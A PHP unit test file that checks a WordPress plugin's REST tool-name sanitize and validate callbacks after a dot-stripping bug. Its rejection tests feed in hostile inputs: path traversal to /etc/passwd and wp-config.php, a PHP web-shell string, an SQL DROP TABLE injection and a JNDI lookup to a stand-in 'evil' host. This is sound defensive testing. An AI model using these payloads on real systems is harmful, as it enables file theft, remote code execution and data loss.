<?php
/**
 * Unit tests: REST tool-identifier grammar, sanitize/validate
 * callbacks (spec BUG-002 — the /tools/execute sanitize_key defect).
 *
 * These exercise ToolsController::sanitizeToolIdentifier() and
 * ::validateToolIdentifier() directly, as pure functions, rather than
 * through a real WP_REST_Server round-trip: the bundled WP shim does
 * not implement register_rest_route()'s args/sanitize_callback/
 * validate_callback pipeline (tracked as TEST-010/TEST-022 — a real
 * REST-transport integration harness is Sprint 0.5 scope, not this
 * bug fix). Testing the callbacks directly still gives full coverage
 * of the actual defect: the grammar mismatch between what
 * Tool::make() requires and what the REST layer permitted through.
 *
 * @package AIOS\Tests\Unit
 */

declare( strict_types=1 );

namespace AIOS\Tests\Unit;

use AIOS\Core\Container;
use AIOS\Rest\Controllers\ToolsController;
use AIOS\Tools\Tool;
use AIOS\Tests\TestCase;
use WP_Error;

final class ToolIdentifierTest extends TestCase {

        private ToolsController $controller;

        protected function setUp(): void {
                $this->controller = new ToolsController( new Container() );
        }

        // ---------------------------------------------------------------- sanitize

        public function test_sanitize_preserves_well_formed_lowercase_identifiers(): void {
                $this->assertEquals( 'content.get_post', $this->controller->sanitizeToolIdentifier( 'content.get_post' ) );
                $this->assertEquals( 'theme.read_file', $this->controller->sanitizeToolIdentifier( 'theme.read_file' ) );
        }

        public function test_sanitize_lowercases_without_changing_identity(): void {
                // Case-folding is meaning-preserving (the registry is
                // exclusively lowercase); it must NOT strip or reorder any
                // character the way the old sanitize_key() callback did.
                $this->assertEquals( 'content.get_post', $this->controller->sanitizeToolIdentifier( 'Content.Get_Post' ) );
                $this->assertEquals( 'content.get_post', $this->controller->sanitizeToolIdentifier( 'CONTENT.GET_POST' ) );
        }

        public function test_sanitize_trims_surrounding_whitespace_only(): void {
                $this->assertEquals( 'content.get_post', $this->controller->sanitizeToolIdentifier( '  content.get_post  ' ) );
        }

        public function test_sanitize_never_removes_the_dot(): void {
                // The exact regression this bug was: sanitize_key() deleted
                // every "." in the identifier. Assert the dot survives for
                // every shape a tool name can take.
                $sanitized = $this->controller->sanitizeToolIdentifier( 'content.get_post' );
                $this->assertStringContains( '.', $sanitized );
        }

        public function test_sanitize_of_non_string_returns_empty_string(): void {
                $this->assertEquals( '', $this->controller->sanitizeToolIdentifier( null ) );
                $this->assertEquals( '', $this->controller->sanitizeToolIdentifier( array( 'content.get_post' ) ) );
        }

        // ---------------------------------------------------------------- validate

        public function test_validate_accepts_well_formed_identifiers(): void {
                $this->assertTrue( $this->controller->validateToolIdentifier( 'content.get_post' ) );
                $this->assertTrue( $this->controller->validateToolIdentifier( 'Content.Get_Post' ), 'validate runs on the raw, pre-sanitize value and must accept mixed case' );
                $this->assertTrue( $this->controller->validateToolIdentifier( 'context.get_site_map' ) );
        }

        public function test_validate_rejects_missing_dot(): void {
                $result = $this->controller->validateToolIdentifier( 'contentgetpost' );
                $this->assertInstanceOf( WP_Error::class, $result );
        }

        public function test_validate_rejects_empty_and_whitespace_only(): void {
                $this->assertInstanceOf( WP_Error::class, $this->controller->validateToolIdentifier( '' ) );
                $this->assertInstanceOf( WP_Error::class, $this->controller->validateToolIdentifier( '   ' ) );
        }

        public function test_validate_rejects_non_string(): void {
                $this->assertInstanceOf( WP_Error::class, $this->controller->validateToolIdentifier( null ) );
                $this->assertInstanceOf( WP_Error::class, $this->controller->validateToolIdentifier( 42 ) );
                $this->assertInstanceOf( WP_Error::class, $this->controller->validateToolIdentifier( array() ) );
        }

        public function test_validate_rejects_special_characters(): void {
                $this->assertInstanceOf( WP_Error::class, $this->controller->validateToolIdentifier( 'content.get-post' ) );
                $this->assertInstanceOf( WP_Error::class, $this->controller->validateToolIdentifier( 'content.get post' ) );
                $this->assertInstanceOf( WP_Error::class, $this->controller->validateToolIdentifier( 'content.get@post' ) );
        }

        public function test_validate_rejects_control_characters(): void {
                $this->assertInstanceOf( WP_Error::class, $this->controller->validateToolIdentifier( "content.get_post\0" ) );
                $this->assertInstanceOf( WP_Error::class, $this->controller->validateToolIdentifier( "content.get_post\n" ) );
        }

        public function test_validate_rejects_path_like_payloads(): void {
                $this->assertInstanceOf( WP_Error::class, $this->controller->validateToolIdentifier( '../../etc/passwd' ) );
                $this->assertInstanceOf( WP_Error::class, $this->controller->validateToolIdentifier( '/etc/passwd' ) );
                $this->assertInstanceOf( WP_Error::class, $this->controller->validateToolIdentifier( 'content.get_post/../../wp-config.php' ) );
        }

        public function test_validate_rejects_code_like_payloads(): void {
                $this->assertInstanceOf( WP_Error::class, $this->controller->validateToolIdentifier( '<?php system($_GET[0]); ?>' ) );
                $this->assertInstanceOf( WP_Error::class, $this->controller->validateToolIdentifier( "content.get_post'; DROP TABLE wp_options; --" ) );
                $this->assertInstanceOf( WP_Error::class, $this->controller->validateToolIdentifier( '${jndi:ldap://evil/a}' ) );
        }

        public function test_validate_rejects_names_without_at_least_one_dot_even_if_otherwise_clean(): void {
                $this->assertInstanceOf( WP_Error::class, $this->controller->validateToolIdentifier( 'contentgetpost' ) );
                $this->assertInstanceOf( WP_Error::class, $this->controller->validateToolIdentifier( 'content_get_post' ) );
        }

        public function test_validate_error_carries_a_client_safe_400_status(): void {
                $result = $this->controller->validateToolIdentifier( 'not-a-valid-name' );
                $this->assertInstanceOf( WP_Error::class, $result );
                /** @var WP_Error $result */
                $data = $result->get_error_data();
                $this->assertEquals( 400, is_array( $data ) ? ( $data['status'] ?? null ) : null );
        }

        // ------------------------------------------------------- shared grammar

        public function test_tool_name_pattern_matches_ability_grammar_intent(): void {
                // Sanity: the constant both Tool::make() and the REST
                // validate_callback share must actually require a dot.
                $this->assertEquals( 1, preg_match( Tool::NAME_PATTERN, 'content.get_post' ) );
                $this->assertEquals( 0, preg_match( Tool::NAME_PATTERN, 'contentgetpost' ) );
        }
}
